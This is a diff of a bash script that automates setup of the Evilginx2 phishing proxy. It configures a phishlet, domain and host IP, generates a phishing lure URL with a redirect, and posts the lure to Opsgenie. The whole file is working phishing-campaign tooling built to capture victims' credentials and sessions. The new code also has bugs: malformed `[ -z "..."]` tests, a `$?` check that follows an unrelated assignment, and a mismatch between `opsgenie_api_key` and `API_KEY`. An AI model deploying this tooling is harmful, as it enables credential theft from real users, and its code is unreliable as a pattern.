@@ -3,8 +3,7 @@
 setup_evilginx() {
     domain_name=$1
     host_ip=$2
-    redirect_url=$3
-    default_phishlet=$4
+    default_phishlet=$3
     
     # Wait for a specific log message that confirms the service is running
     while ! pgrep -x "evilginx" > /dev/null; do
@@ -202,29 +201,45 @@ mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data
 /bin/evilginx -p /app/phishlets/ -developer -debug
 
 # Check if any of the critical values are empty, "", or "none"
-if [[ -z "$domain_name" || "$domain_name" == "none" ]] || \
-   [[ -z "$host_ip" || "$host_ip" == "none" ]] || \
-   [[ -z "$default_phishlet" || "$default_phishlet" == "none" ]]; then
-    echo "Missing critical value." >&2
+if [ -z "$domain_name"]; then
+    echo "Error: 'domain_name' is missing." >&2
     exit 1
 fi
-#Setup EvilGinx2
-setup_evilginx $domain_name $host_ip $default_redirect $default_phishlet 
 
-
-if [[ -z "$default_redirect" || "$default_redirect" == "none" ]]; then
-    echo "Missing critical value." >&2
+if [ -z "$host_ip"]; then
+    echo "Error: 'host_ip' is missing." >&2
     exit 1
 fi
+
+if [ -z "$default_phishlet"]; then
+    echo "Error: 'default_phishlet' is missing." >&2
+    exit 1
+fi
+
+# Setup Evilginx2
+setup_evilginx "$domain_name" "$host_ip" "$default_phishlet"
+
+# Check if default_redirect is missing
+if [ -z "$default_redirect"]; then
+    echo "Error: 'default_redirect' is missing." >&2
+    exit 1
+fi
+
 # Automate multiple lure creation
-#create_lure $default_phishlet $domain_name "https://portal.office.com"
-lure_url=$(create_lure $default_phishlet $domain_name $default_redirect)
+lure_url=$(create_lure "$default_phishlet" "$domain_name" "$default_redirect")
+API_URL="https://api.opsgenie.com/v2/alerts"
+# Check if the Lure function call was successful
+if [[ $? -eq 0 ]]; then
+    echo "Lure created successfully: $lure_url"
+    
+    # Check if opsgenie_api_key is missing
+    if [ -z "$opsgenie_api_key"]; then
+        echo "Error: 'opsgenie_api_key' is missing." >&2
+    else
+        send_opsgenie_alert "$API_KEY" "$API_URL" "$lure_url"
+        echo "Sent Opsgenie Lure Alert"
+    fi
 
-if [[ -z "$opsgenie_api_key" || "$opsgenie_api_key" == "none" ]] || \
-   [[ -z "$lure_url" || "$lure_url" == "none" ]]; then
-    echo "Missing critical value." >&2
-    exit 1
+else
+    echo "Failed to create lure."
 fi
-# Example usage of the function
-API_URL="https://api.opsgenie.com/v2/alerts" # This can be dynamically changed
-send_opsgenie_alert "$API_KEY" "$API_URL" "$lure_url"
